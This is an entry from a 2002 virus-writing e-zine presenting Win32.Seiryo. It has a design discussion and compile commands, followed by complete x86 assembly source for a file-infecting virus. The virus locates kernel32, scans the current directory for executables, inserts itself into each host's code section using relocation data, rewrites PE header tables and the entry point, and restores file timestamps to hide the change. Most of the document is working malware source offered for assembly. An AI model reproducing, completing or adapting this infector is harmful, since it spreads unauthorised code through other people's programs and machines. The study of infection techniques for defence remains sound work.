 COMMENT ` ---------------------------------------------------------------- )=-
 -=( Natural Selection Issue #1 ------------------------------ Win32.Seiryo )=-
 -=( ---------------------------------------------------------------------- )=-

 -=( 0 : Win32.Seiryo Features -------------------------------------------- )=-

 Imports:       Locates the Kernel, does it's own imports
 Infects:       PE files containing .reloc section by expanding the host's CODE
                section and  putting itself  in it  (and not  setting the write
                bit)
 Locates:       Files in current directory
 Compatibility: All tested windows versions
 Saves Stamps:  Yes
 MultiThreaded: No
 Polymorphism:  None
 AntiAV / EPO:  None
 SEH Abilities: None
 Payload:       None

 -=( 1 : Win32.Seiryo Design Goals ---------------------------------------- )=-

 The purpose of this  virus was to test  a relatively new method  of allocating
 space for a virus.  Traditionally, the virus is simply appended to the end  of
 the file as either a separate  section or tacked onto the last  section.  This
 has the problem that usually the entry  point to the file is now not  the code
 section, and inevitably program execution leaves the code section.

 This idea was derived from Zombie's Zmist - that is to use the .reloc section.
 This virus looks for a file with a reloc section, memory maps it, and proceeds
 to expand the code section to fit the virus.  It then copies itself into  this
 space.  All the other sections are moved back to make space for the virus, the
 code section is updated to reflect these changes (thanks to reloc telling  you
 where the data is),  and then the entire  PE header must be  updated.  So, how
 well does this method work?

 Here's a breakdown of what must be done and it's complexity:

 : Calculating the move amounts/new addresses is straight forward.
 : Using .reloc to update the .text is surprisingly easy

 But:

 : Fixing up EVERY RVA/VA in the PE header is a nightmare, especially with  the
 documentation on the more obscure parts of it being hard to come by. The  main
 stuff that NEEDS to be fixed is:
        : PE Header (SizeOfImage, etc)
        : Data Directory
        : Section Table
        : Import Tables (HNA, and first thunk too)
        : .reloc section
        : Resource Section (else icons disappear - may as well write a
          prepending virus if you don't)
        : Export Section (and all that goes with that)
        : Debug Entries (optional - just zero it)
        : There are about 5-8 more thing, but they are never used and
          good documentation on them is scarce

 So, how well does it work?  It works ok.

 Well,  coding  it  is  lots of  work,  and  the  debugging highly  unpleasant.
 Reconstructed  files  are  surprisingly  stable  providing  that  the  code is
 correctly debugged.  It could well become the preferred method of infection in
 terms of stealth.  The lengthy code, potential bugs, and complexity could be a
 deterrence for use in an average virus.

 -=( 2 : Win32.Seiryo Design Faults --------------------------------------- )=-

 This is a test virus, so the it's spreading ability is minimal.

 The major drawback to this infection method is that not all files have  .reloc
 sections.  In fact, only about half of non-system files,  maybe less have one.
 Thus this method should probably have a backup method of space allocation.

 -=( 3 : Win32.Seiryo Disclaimer ------------------------------------------ )=-

 THE CONTENTS OF  THIS ELECTRONIC MAGAZINE  AND ITS ASSOCIATED  SOURCE CODE ARE
 COVERED UNDER THE BELOW TERMS AND CONDITIONS.  IF YOU DO NOT AGREE TO BE BOUND
 BY THESE TERMS AND CONDITIONS, OR  ARE NOT LEGALLY ENTITLED TO AGREE  TO THEM,
 YOU MUST DISCONTINUE USE OF THIS MAGAZINE IMMEDIATELY.

 COPYRIGHT
 Copyright on  materials in  this  magazine  and  the  information  therein and
 their  arrangement is owned by FEATHERED SERPENTS  unless otherwise indicated.

 RIGHTS AND LIMITATIONS
 You have  the  right  to use,    copy and  distribute  the  material in   this
 magazine free   of  charge,  for  all   purposes  allowed  by your   governing
 laws.  You    are expressly  PROHIBITED   from   using the  material contained
 herein  for   any   purposes  that   would   cause    or would    help promote
 the illegal   use of the material.

 NO WARRANTY
 The  information   contained within   this  magazine  are  provided  "as  is".
 FEATHERED    SERPENTS     do    not    warranty    the     accuracy, adequacy,
 or   completeness     of     given  information,  and    expressly   disclaims
 liability   for   errors   or   omissions    contained  therein.   No implied,
 express, or statutory  warranty, is given  in conjunction with  this magazine.

 LIMITATION OF LIABILITY
 In *NO* event will FEATHERED SERPENTS or any of its MEMBERS be liable for  any
 damages  including  and  without  limitation,  direct  or  indirect,  special,
 incidental,  or  consequential  damages,   losses,  or  expenses  arising   in
 connection with this magazine, or the use thereof.

 ADDITIONAL DISCLAIMER
 Computer viruses will spread of their own accord between computer systems, and
 across international boundaries.  They are raw animals with no concern for the
 law, and for that reason your possession of them makes YOU responsible for the
 actions they carry out.

 The viruses provided in this magazine are for educational purposes ONLY.  They
 are NOT intended for use in  ANY WAY outside of strict, controlled  laboratory
 conditions.  If compiled and executed these viruses WILL land you in court(s).

 You will be held responsible for your actions.  As  source code these  viruses
 are  inert  and   covered   by   implied  freedom   of  speech   laws  in some
 countries.  In  binary form  these viruses  are malicious  weapons.  FEATHERED
 SERPENTS do not condone the application of these viruses and will NOT be  held
 LIABLE for any MISUSE.

 -=( 4 : Win32.Seiryo Compile Instructions -------------------------------- )=-

 TASM32 5.0  &  TLINK32 1.6.71.0

 tasm32 /m /ml Seiryo.asm
 tlink32 /Tpe /x Seiryo.obj, Seiryo.exe,,import32.lib

 -=( 5 : Win32.Seiryo ----------------------------------------------------- ) `

%out Assembling file implies acceptance of disclaimer inside source code

.386
.model flat, stdcall
warn                                            ; Warnings on

VIRSIZE equ VirEnd - VirStart

extrn ExitProcess:PROC
INVALID_HANDLE_VALUE    equ     0FFFFFFFFh
OPEN_EXISTING           equ     3
FILE_SHARE_WRITE        equ     0002h
FILE_BEGIN              equ     0
FILE_MAP_WRITE          equ     2
GENERIC_READ            equ     80000000h
GENERIC_WRITE           equ     40000000h
PAGE_READWRITE          equ     00000004h

WIN32_FIND_DATA         struct
fd_dwFileAttributes     dd      0
fd_ftCreationTime       dd      0, 0
fd_ftLastAccessTime     dd      0, 0
fd_ftLastWriteTime      dd      0, 0
fd_nFileSizeHigh        dd      0
fd_nFileSizeLow         dd      0
fd_dwReserved0          dd      0
fd_dwReserved1          dd      0
fd_cFileName            db      260 dup(0)
fd_cAlternateFileName   db      14 dup(0)
WIN32_FIND_DATA         ends

PEHEADER struct
                ID                              dd      ?
                Machine                         dw      ?
                NumberOfSections                dw      ?
                TimeDateStamp                   dd      ?
                PointerToSymbolTable            dd      ?
                NumberOfSymbols                 dd      ?
                SizeOfOptionalHeader            dw      ?
                Characteristics                 dw      ?
; Optional Header:
                MagicNumber                     dw      ?
                MajorLinkerVersion              db      ?
                MinorLinkerVersion              db      ?
                SizeOfCode                      dd      ?
                SizeOfInitializedData           dd      ?
                SizeOfUninitializedData         dd      ?
                AddressOfEntryPoint             dd      ?
                BaseOfCode                      dd      ?
                BaseOfData                      dd      ?
                ImageBase                       dd      ?
                SectionAlignment                dd      ?
                FileAlignment                   dd      ?
                MajorOperatingSystemVersion     dw      ?
                MinorOperatingSystemVersion     dw      ?
                MajorImageVersion               dw      ?
                MinorImageVersion               dw      ?
                MajorSubsystemVersion           dw      ?
                MinorSubsystemVersion           dw      ?
                Reserved1                       dd      ?
                SizeOfImage                     dd      ?
                SizeOfHeaders                   dd      ?
                CheckSum                        dd      ?
                Subsystem                       dw      ?
                DllCharacteristics              dw      ?
                SizeOfStackReserve              dd      ?
                SizeOfStackCommit               dd      ?
                SizeOfHeapReserve               dd      ?
                SizeOfHeapCommit                dd      ?
                LoaderFlags                     dd      ?
                NumberOfRvaAndSizes             dd      ?
                DataDirectory                   dd      20 dup (?)
PEHEADER ends

; -**************************-
;  Section Table Entry format
; -**************************-

SECTION struct
                sec_Name                        db      8 dup (?)
                sec_VirtualSize                 dd      ?
                sec_VirtualAddress              dd      ?
                sec_SizeOfRawData               dd      ?
                sec_PointerToRawData            dd      ?
                sec_PointerToRelocations        dd      ?
                sec_PointerToLinenumbers        dd      ?
                sec_NumberOfRelocations         dw      ?
                sec_NumberOfLineNumbers         dw      ?
                sec_Characteristics             dd      ?
SECTION ends
; Section Characteristics flags
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SEC_CODE                equ     00000020h
SEC_INITIALIZED_DATA    equ     00000040h
SEC_UNINITIALIZED_DATA  equ     00000080h
SEC_NO_CACHE            equ     04000000h
SEC_NOT_PAGEABLE        equ     08000000h
SEC_SHARED              equ     10000000h
SEC_EXECUTABLE          equ     20000000h
SEC_READ                equ     40000000h
SEC_WRITE               equ     80000000h

; -*******************-
;  Import Table format
; -*******************-

IMPORTTABLE struct
                imp_Characteristics             dd      ?
                imp_DateTimeStamp               dd      ?
                imp_ForwarderChain              dd      ?
                imp_Name                        dd      ?
                imp_FirstThunk                  dd      ?
IMPORTTABLE ends

; -*******************-
;  Export Table format
; -*******************-

EXPORTHEADER struct
                exp_Characteristics             dd      ?
                exp_DateTimeStamp               dd      ?
                exp_MajorVersion                dw      ?
                exp_MinorVersion                dw      ?
                exp_Name                        dd      ?
                exp_Base                        dd      ?
                exp_NumberOfFunctions           dd      ?
                exp_NumberOfNames               dd      ?
                exp_AddressOfFunctions          dd      ?
                exp_AddressOfNames              dd      ?
                exp_AddressOfNameOrdinals       dd      ?
EXPORTHEADER ends

; -******************-
;  Resource Dir Table
; -******************-

RESOURCETABLE struct
                res_Characteristics             dd      ?
                res_DateTimeStamp               dd      ?
                res_MajorVersion                dw      ?
                res_MinorVersion                dw      ?
                res_NumNameEntry                dw      ?
                res_NumIDEntry                  dw      ?
RESOURCETABLE ends
RESOURCEENTRY struct
                resent_ID                       dd      ?
                resent_Next                     dd      ?
RESOURCEENTRY ends

; -****************-
;  Thread Dir Table
; -****************-

THREADTABLE struct
                thread_StartDataVA              dd      ?
                thread_EndDataVA                dd      ?
                thread_IndexVA                  dd      ?
                thread_CallbackTableVA          dd      ?
THREADTABLE ends



.DATA
dummy db 0



; *******
; Local Variables
; *******
AlignPhys               equ -3
AlignVirtual            equ -4
VirusRVA                equ AlignVirtual-4
VirusVA                 equ VirusRVA-4
MoveAmount              equ VirusVA-4
PhysMove                equ MoveAmount-4
_FindFirstFileA         equ PhysMove-4
_CreateFileA            equ _FindFirstFileA-4
_CreateFileMappingA     equ _CreateFileA-4
_MapViewOfFile          equ _CreateFileMappingA-4
_UnmapViewOfFile        equ _MapViewOfFile-4
_SetFilePointer         equ _UnmapViewOfFile-4
_SetEndOfFile           equ _SetFilePointer-4
_SetFileTime            equ _SetEndOfFile-4
_CloseHandle            equ _SetFileTime-4
_FindNextFileA          equ _CloseHandle-4
Imports                 equ _FindNextFileA              ; Label (no -4)
FileFind                equ Imports-size WIN32_FIND_DATA
FileFindHnd             equ FileFind-4
SizeOfLocals            equ -FileFindHnd

.CODE
VirStart:
start:
        push    ebp                             ; Setup locals on stack
        mov     ebp, esp
        sub     esp, SizeOfLocals

        mov     edi, [ebp+4]
        and     edi, 0FFFFf000h
        mov     ecx, 128
FindKernelLoop:
        cmp     word ptr [edi], 'ZM'
        je      short GotKernel
        sub     edi, 1000h
        loop    FindKernelLoop
GotoExitInfector:
        jmp     ExitInfector
GotKernel:
        movzx   edx, word ptr [edi+3Ch]
        add     edx, edi
        cmp     dword ptr [edx], 'EP'
        jne     short GotoExitInfector

        mov     edx, [edx].DataDirectory        ; Get Kernel Exports
        add     edx, edi
        xor     ecx, ecx
        mov     esi, [edx].exp_AddressOfNames
        add     esi, edi
FindGetProc:
        inc     ecx
        cmp     ecx, [edx].exp_NumberOfNames
        jg      short GotoExitInfector
        lodsd
        add     eax, edi
        cmp     [eax], 'PteG'
        jne     short FindGetProc
        cmp     [eax+4], 'Acor'
        jne     short FindGetProc
        cmp     [eax+8], 'erdd'
        jne     short FindGetProc

        mov     ebx, [edx].exp_AddressOfNameOrdinals
        add     ebx, edi
        movzx   ecx, word ptr [ebx+2*ecx]
        sub     ecx, [edx].exp_Base
        mov     ebx, [edx].exp_AddressOfFunctions
        add     ebx, edi
        mov     edx, [ebx+4*ecx]
        add     edx, edi

        call    PushImportsAddress
        db      14,'FindNextFileA',0
        db      12,'CloseHandle',0
        db      12,'SetFileTime',0
        db      13,'SetEndOfFile',0
        db      15,'SetFilePointer',0
        db      16,'UnmapViewOfFile',0
        db      14,'MapViewOfFile',0
        db      19,'CreateFileMappingA',0
        db      12,'CreateFileA',0
        db      15,'FindFirstFileA',0
        db      0
PushImportsAddress:
        pop     esi
        xor     ecx, ecx
        mov     ebx, edi
        lea     edi, [ebp+Imports]
ImportLoop:
        mov     cl, [esi]
        inc     esi
        jecxz   DoneImports
        push    edx
        push    ecx
        call    edx, ebx, esi
        or      eax, eax
        jz      ExitInfector
        pop     ecx
        pop     edx
        stosd
        add     esi, ecx
        jmp     short ImportLoop
DoneImports:

        lea     eax, [ebp+FileFind]             ; Find an Exe file
        push    eax
        call    PushFileMask
        db      '*.exe',0
PushFileMask:
        call    [ebp+_FindFirstFileA]
        mov     [ebp+FileFindHnd], eax
        cmp     eax, INVALID_HANDLE_VALUE
        je      ExitInfector


InfectNextFile:
        lea     eax, [ebp+FileFind].fd_cFileName        ; Get FileName
        cmp     byte ptr [eax], 0                       ;  use short if no long
        jne     short UseLongFileName
        lea     eax, [ebp+FileFind].fd_cAlternateFileName
UseLongFileName:

        call    [ebp+_CreateFileA], eax, GENERIC_READ+GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0
        cmp     eax, INVALID_HANDLE_VALUE       ; Map the file
        je      FindTheNextFile
        push    eax                             ; Push FileHandle for close
        mov     ebx, [ebp+FileFind].fd_nFileSizeLow
        add     ebx, VIRSIZE+10000
        call    [ebp+_CreateFileMappingA], eax, 0, PAGE_READWRITE, 0, ebx, 0
        or      eax, eax
        je      CloseAndExitInfector
        push    eax
        xchg    eax, esi
        call    [ebp+_MapViewOfFile], esi, FILE_MAP_WRITE, 0, 0, 0
        push    eax                             ; Push Memory Addy for close
        mov     esi, eax

        cmp     word ptr [eax], 'ZM'            ; Check if exe is ok to infect
        jne     InfectableNo
        cmp     word ptr [eax+18h], 40h
        jb      InfectableNo
        movzx   ecx, word ptr [eax+3Ch]
        add     eax, ecx
        cmp     dword ptr [eax], 'EP'
        jne     InfectableNo
        cmp     [eax].NumberOfRvaAndSizes, 10
        jb      InfectableNo
        cmp     [eax].MinorLinkerVersion, 7     ; Infection Marker
        je      InfectableNo

        movzx   edx, [eax].SizeOfOptionalHeader
        lea     edx, [eax+edx+18h]              ; Start of Section table

; Check For code section being first
        test    [edx].sec_Characteristics, SEC_CODE
        jz      InfectableNo

        mov     byte ptr [ebp+AlignVirtual],1           ; See if Virt aligned
        mov     ebx, [edx].sec_VirtualSize
        mov     ecx, [eax].SectionAlignment
        dec     ecx
        test    ebx, ecx
        jz      short VirtuallyAligned
        dec     byte ptr [ebp+AlignVirtual]
VirtuallyAligned:

        mov     byte ptr [ebp+AlignPhys],1              ; See if Phys aligned
        mov     edi, [edx].sec_SizeOfRawData
        mov     ecx, [eax].FileAlignment
        dec     ecx
        test    edi, ecx
        jz      short PhysicallyAligned
        dec     byte ptr [ebp+AlignPhys]
PhysicallyAligned:
        cmp     ebx, edi                                ; Which is smaller?
        jbe     short UseVirtualSize                    ; (i.e. actual size)
        mov     ebx, edi
UseVirtualSize:

        mov     edi, ebx                        ; Find Physical move amount
        add     edi, [edx].sec_PointerToRawData
        lea     edi, [edi+ecx+VIRSIZE]
        not     ecx
        and     edi, ecx
        mov     [ebp+PhysMove], edi

        add     ebx, [edx].sec_VirtualAddress   ; Find VA & RVA of virus
        mov     [ebp+VirusRVA], ebx
        mov     edi, ebx
        add     ebx, [eax].ImageBase
        mov     [ebp+VirusVA], ebx

        movzx   ecx, [eax].NumberOfSections             ; Code Section First?
        mov     ebx, [edx].sec_VirtualAddress
        push    edx
        push    ecx
CheckForFirstSection:
        cmp     ebx, [edx].sec_VirtualAddress
        ja      InfectableNo
        add     edx, size SECTION
        loop    CheckForFirstSection
        pop     ecx
        pop     edx

        dec     ecx                                     ; Section 2 is Next?
        jz      short DoneCheckNextSec
        mov     ebx, [edx + size SECTION].sec_PointerToRawData
        sub     [ebp+PhysMove], ebx
        mov     ebx, [edx + size SECTION].sec_VirtualAddress
        cmp     ebx, [eax].AddressOfEntryPoint  ; Entry Point in code sec?
        jbe     InfectableNo
CheckNextSec:
        add     edx, size SECTION
        cmp     ebx, [edx].sec_VirtualAddress
        ja      InfectableNo
        loop    CheckNextSec


DoneCheckNextSec:
        add     edi, VIRSIZE                    ; Calculate Virtual Move amount
        mov     ecx, [eax].SectionAlignment
        dec     ecx
        add     edi, ecx
        not     ecx
        and     edi, ecx
        sub     edi, ebx
        jae     short PositiveMoveAmount
        xor     edi, edi
PositiveMoveAmount:
        mov     [ebp+MoveAmount], edi


; ************
; Goto relocation section

        mov     eax, [eax].DataDirectory+40     ; Reloc Offset
        or      eax, eax
        jz      InfectableNo
        call    RVA2Addr
        mov     edi, eax

; EDI = start of relocation info (struct: repeat of following).
; RELOC INFO is:
;       RVA  dd ?
;       Size dd ?  - includes the 8 bytes for this and above field.
;                  - should always be 32bit aligned.
;       entries dw (Size-8)/2 dup (?)
; Rellocs end when next RVA is 0
; Each entry's top 4 bits are the type of relocation.  The rest of the 12 bits
;  are an offset from the RVA of the position.
;  (i.e.  address = RVA + (entry & 0x0FFF) )
; Currently handles only relocations of types 0 (nop) and 3 (normal)

MoveRelocLoop:
        mov     eax, [edi]
        or      eax, eax                        ; If RVA=0 then done
        je      short DoneReloc
        cmp     eax, [ebp+VirusRVA]             ; reloc it if < VirusRVA
        jb      short MoveRelocSkip
        mov     ecx, [ebp+MoveAmount]
        add     [edi], ecx
MoveRelocSkip:
        mov     ecx, [edi+4]
        sub     ecx, 8
        shr     ecx, 1                          ; ecx = number of entries
        add     edi, 8
        call    RVA2Addr
        mov     edx, eax

InnerRelocLoop:
        jecxz   MoveRelocLoop                   ; Done block if ecx=0 - do next
        dec     ecx
        movzx   eax, word ptr [edi]
        inc     edi
        inc     edi
        mov     ebx,eax
        shr     ebx, 12                         ; ebx = top 4 bits of entry
        jz      short InnerRelocLoop            ; if 0, then it's padding
        cmp     ebx, 3
        jne     InfectableNo
        and     ah,0Fh                          ; remove type
        mov     ebx, [eax+edx]                  ; reloc if necessary
        cmp     ebx, [ebp+VirusVA]
        jb      short InnerRelocLoop
        mov     ebx, [ebp+MoveAmount]
        add     dword ptr [eax+edx], ebx
        jmp     short InnerRelocLoop

;RelocError:
;        int     3
;        int     3
DoneReloc:

; ************
;  Move physically
; ************

        movzx   edx, word ptr [esi+3Ch]         ; From the new virus position
        add     edx, esi                        ;  move everything to EOF back
        mov     eax,[ebp+VirusRVA]              ;  by PhysMove
        mov     [ebp+VirusRVA], eax             ;  To do this, start at EOF
        dec     eax                             ;  and go backwards to start
        call    RVA2Addr                        ;  (hence std/rep movsb)
        inc     eax
        mov     ecx, esi
        add     ecx, [ebp+FileFind].fd_nFileSizeLow
        sub     ecx, eax
        xchg    eax, ebx
        push    esi
        lea     esi, [ebx+ecx-1]
        mov     eax, [ebp+PhysMove]
        add     [ebp+FileFind].fd_nFileSizeLow, eax
        lea     edi, [esi+eax]
        std
        rep     movsb
        cld
        mov     ecx, VIRSIZE                    ; Copy code into it
        mov     edi, ebx
        call    GetVirStart
GetVirStart:
        pop     esi
        sub     esi, GetVirStart-VirStart
        rep     movsb
        pop     esi


; ***********************
;  Fix RVAs and other
; ***********************


; PE Header Fix
;  Entry Point - should be fine for now
;  ImageSize
        mov     eax, [ebp+MoveAmount]
        add     [edx].SizeOfImage, eax
;  SizeOfCode
        add     [edx].SizeOfCode, eax
;  BaseOfData
        add     [edx].BaseOfData, eax
;  DataDirectory:
        mov     ecx, [edx].NumberOfRvaAndSizes
        lea     edi, [edx].DataDirectory
DataDirLoop:
        mov     eax, [edi]
        or      eax, eax
        jz      short DataDirSkip
        cmp     eax, [ebp+VirusRVA]
        jb      short DataDirSkip
        add     eax, [ebp+MoveAmount]
        mov     [edi], eax
DataDirSkip:
        add     edi,8
        loop    DataDirLoop

; Fix Section Table (edi conviniently points to it now)
        mov     eax, [ebp+VirusRVA]
        sub     eax, [edi].sec_VirtualAddress
        add     eax, VIRSIZE
        cmp     byte ptr [ebp+AlignVirtual],1
        jne     short NoVirtAlign
        mov     ecx, [edx].SectionAlignment
        dec     ecx
        add     eax, ecx
        not     ecx
        and     eax, ecx
NoVirtAlign:
        mov     [edi].sec_VirtualSize, eax
        mov     eax, [edi].sec_SizeOfRawData
        add     eax, [ebp+PhysMove]
        mov     [edi].sec_SizeOfRawData, eax

        movzx   ecx, [edx].NumberOfSections
        mov     ebx, [ebp+PhysMove]
SectionTableFixUp:
        mov     eax, [edi].sec_VirtualAddress
        cmp     eax, [ebp+VirusRVA]
        jb      short NextSecFixUp
        add     eax, [ebp+MoveAmount]
        mov     [edi].sec_VirtualAddress, eax
        add     [edi].sec_PointerToRawData,ebx
NextSecFixUp:
        add     edi, size SECTION
        loop    SectionTableFixUp

; Fix Up Relocation Section - done above (during reloc)

; Fix up Imports
        movzx   eax, word ptr [esi+3Ch]
        add     eax, esi
        mov     eax, [eax].DataDirectory+8
        call    RVA2Addr
        xchg    eax, edi
        mov     ebx, [ebp+MoveAmount]
FixNextImport:
        mov     eax, [edi].imp_Name
        or      eax, eax
        je      short DoneImportFix
        cmp     eax, [ebp+VirusRVA]
        jb      short SkipImpNameFix
        add     [edi].imp_Name, ebx
SkipImpNameFix:
        mov     eax, [edi].imp_Characteristics
        or      eax, eax
        jz      short FixFirstThunk
        cmp     eax, [ebp+VirusRVA]
        jb      short SkipImpCharFix
        add     eax, ebx
        mov     [edi].imp_Characteristics, eax
SkipImpCharFix:
        ; Fix Characteristic field now
        call    RVA2Addr
ImpCharLoop:
        mov     ecx, [eax]
        or      ecx, ecx
        jz      short ImpCharLoopDone
        js      short ImpCharLoopNoFix
        cmp     ecx, [ebp+VirusRVA]
        jb      short ImpCharLoopNoFix
        add     [eax], ebx
ImpCharLoopNoFix:
        add     eax, 4
        jmp     short ImpCharLoop
ImpCharLoopDone:

FixFirstThunk:
        mov     eax, [edi].imp_FirstThunk
        cmp     eax, [ebp+VirusRVA]
        jb      short DoneSectionFix
        add     eax, ebx
        mov     [edi].imp_FirstThunk, eax
DoneSectionFix:
        call    RVA2Addr
ImpThunkLoop:
        mov     ecx, [eax]
        or      ecx, ecx
        jz      short ImpThunkLoopDone
        js      short ImpThunkNoFix
        cmp     ecx, [ebp+VirusRVA]
        jb      short ImpThunkNoFix
        add     dword ptr [eax], ebx
ImpThunkNoFix:
        add     eax, 4
        jmp     short ImpThunkLoop
ImpThunkLoopDone:
        add     edi, size IMPORTTABLE
        jmp     short FixNextImport
DoneImportFix:


; Fix up Resource (2)
        mov     eax, [edx].DataDirectory+(2*8)
        or      eax, eax
        jz      short FixUpNoResources
        call    RVA2Addr
        push    edx
        mov     edx, eax
        xchg    eax, edi
        mov     ebx, [ebp+MoveAmount]
        call    FixupResource
        pop     edx
FixUpNoResources:

;FixUpExports:
        mov     eax, [edx].DataDirectory
        or      eax, eax
        jz      short FixUpNoExports
        call    RVA2Addr
        push    edx
        mov     edx, [ebp+VirusRVA]
        xchg    eax, edi
        add     [edi].exp_Name, ebx             ; Fix dll name
        add     [edi].exp_AddressOfFunctions, ebx  ; Fix RVA to address Array
        mov     eax, [edi].exp_AddressOfFunctions
        call    RVA2Addr
        mov     ecx, [edi].exp_NumberOfFunctions
ExpFixFuncRVAsLoop:                             ; Not handling ecx=0, who cares
        cmp     [eax], edx
        jb      short ExpFixFuncSkipRVA
        add     [eax], ebx
ExpFixFuncSkipRVA:
        add     eax, 4
        loop    ExpFixFuncRVAsLoop
        add     [edi].exp_AddressOfNames, ebx
        mov     eax, [edi].exp_AddressOfNames
        call    RVA2Addr
        mov     ecx, [edi].exp_NumberOfNames
ExpFixNameRVAsLoop:
        cmp     [eax], edx
        jb      short ExpFixNameSkipRVA
        add     [eax], ebx
ExpFixNameSkipRVA:
        add     eax, 4
        loop    ExpFixNameRVAsLoop
        add     [edi].exp_AddressOfNameOrdinals, ebx
        pop     edx
FixUpNoExports:

        xor     eax, eax
        mov     [edx].DataDirectory+(6*8), eax          ;  Kill debug info
        mov     [edx].DataDirectory+(6*8+4), eax        ;  Kill debug info

; Fix Thread Storage
;  - All are VAs - thus they seem to be fixed by fixing the reloc entries.
;  (at least in my test files)
;
;       mov     eax, [edx].DataDirectory+(9*8)
;       or      eax, eax
;       jz      short NoThreadStorage
;       call    RVA2Addr
;       xchg    eax, edi
;
;       mov     eax, [edi].thread_StartDataVA
;       cmp     eax, [ebp+VirusVA]
;       jb      short ThreadNoFixStart
;       add     [edi].thread_StartDataVA, ebx
;ThreadNoFixStart:
;       mov     eax, [edi].thread_EndDataVA
;       cmp     eax, [ebp+VirusVA]
;       jb      short ThreadNoFixEnd
;       add     [edi].thread_StartDataVA, ebx
;ThreadNoFixEnd:
;       mov     eax, [edi].thread_IndexVA
;       cmp     eax, [ebp+VirusVA]
;       jb      short ThreadNoFixIndex
;       add     [edi].thread_IndexVA, ebx
;ThreadNoFixIndex:
;       mov     eax, [edi].thread_CallbackTableVA
;       cmp     eax, [ebp+VirusVA]
;       jb      short ThreadNoFixCallback
;       add     [edi].thread_CallbackTableVA, ebx
;ThreadNoFixCallback:
;       sub     eax, [edx].ImageBase
;       call    RVA2Addr

NoThreadStorage:

; Fiddle with entry point
        mov     [edx].MinorLinkerVersion, 7
        mov     ecx, [edx].AddressOfEntryPoint
        mov     eax, [ebp+VirusRVA]
        mov     [edx].AddressOfEntryPoint, eax  ; Set new entry point
        add     eax, offset HostFileEntryPoint - offset VirStart
        sub     ecx, 4
        sub     ecx, eax
        call    RVA2Addr
        mov     [eax], ecx              ; Fix Jump to host in mem map


; Checklist:
; ---------
; Fix up Exports (0)                    done
; Fix up Imports (1)                    done
; Fix up Resource (2)                   done
; Fix up Exception (3)
; Fix up Security (4)
; Fix up Reloc (5)                      done
; Fix up Debug (6)                      zeroed
; Fix up Description/Architecture (7)   done?
; Fix up Machine Value (8)
; Fix up ThreadStorage (9)              done by reloc fixup?
; Fix up LoadConfiuration (10)
; Fix up Bound Import (11)
; Fix up Import Address Table (12)      done by imports fixup
; Fix up Delay Import (13)
; Fix up COM Runtime Descriptor (14)

InfectableNo:
UnmapAndClose:
        call    [ebp+_UnmapViewOfFile]
        call    [ebp+_CloseHandle]
        mov     ebx, [esp]                      ; Reset File Size
        call    [ebp+_SetFilePointer], ebx, [ebp+FileFind].fd_nFileSizeLow, 0, FILE_BEGIN
        call    [ebp+_SetEndOfFile], ebx
        lea     eax, [ebp+FileFind].fd_ftCreationTime
        lea     ecx, [ebp+FileFind].fd_ftLastAccessTime
        lea     edx, [ebp+FileFind].fd_ftLastWriteTime
        call    [ebp+_SetFileTime], ebx, eax,ecx,edx
CloseAndExitInfector:
        call    [ebp+_CloseHandle]
FindTheNextFile:
        lea     eax, [ebp+FileFind]
        call    [ebp+_FindNextFileA], dword ptr [ebp+FileFindHnd], eax
        or      eax, eax
        jnz     InfectNextFile

ExitInfector:
        mov     esp, ebp
        pop     ebp
        db      0E9h                    ; jmp VirEnd (full displacement)
HostFileEntryPoint:
        dd      offset VirEnd - offset HostFileEntryPoint - 4

; Fix up resource
; edi = base address of resource
; edx = current shit
; ebx = reloc amount
FixupResource:
        push    eax
        push    ecx
        push    edx
        movzx   ecx, [edx].res_NumNameEntry
        movzx   eax, [edx].res_NumIDEntry
        add     ecx, eax
        add     edx, size RESOURCETABLE
FixResourceLoop:
;       no need to mess with [edx].resent_ID
;       it's either an 31-bit integer or the top bit is set and it's a
;         relative displacement from the resource base address
FixResourceIsID:
        mov     eax, [edx].resent_Next
        or      eax, eax
        js      short FixResourceRecurse
        add     [edi+eax], ebx                  ; Fix RVA
        jmp     short FixResourceNext
FixResourceRecurse:
        btc     eax,31                          ; kill top bit
        push    edx                             ; save current position
        lea     edx, [edi+eax]                  ; find pos of next res dir
        call    FixupResource                   ; Recursively fix
        pop     edx
FixResourceNext:
        add     edx, size RESOURCEENTRY
        loop    FixResourceLoop
        pop     edx
        pop     ecx
        pop     eax
        ret


; From RVA calculate Physical offset
; Enter
;  eax = RVA
;  esi = Start Of Memory mapped PE file.
; Leave:
;  eax = Mem map Address
RVA2Addr:
        push    ebx
        push    edx
        push    ecx
        push    esi
        push    edi
        movzx   edi, word ptr [esi+3Ch]
        add     edi, esi
        movzx   edx, [edi].SizeOfOptionalHeader
        movzx   ecx, [edi].NumberOfSections
        lea     edx, [edi+edx+18h]              ; Start of Section table
        mov     ebx, [edx].sec_VirtualAddress
        mov     esi, [edx].sec_PointerToRawData
SectionLoop1:
        cmp     ebx, [edx].sec_VirtualAddress
        jae     short SkipSecLoop1
        cmp     eax, [edx].sec_VirtualAddress
        jb      short SkipSecLoop1
        mov     ebx, [edx].sec_VirtualAddress
        mov     esi, [edx].sec_PointerToRawData
SkipSecLoop1:
        add     edx, size SECTION
        loop    SectionLoop1
        sub     eax, ebx
        add     eax, esi
        pop     edi
        pop     esi
        add     eax, esi
        pop     ecx
        pop     edx
        pop     ebx
        ret


VirEnd:
        call ExitProcess, 0
end start

 COMMENT ` ---------------------------------------------------------------- )=-
 -=( Natural Selection Issue #1 --------------- (c) 2002 Feathered Serpents )=-
 -=( ---------------------------------------------------------------------- ) `
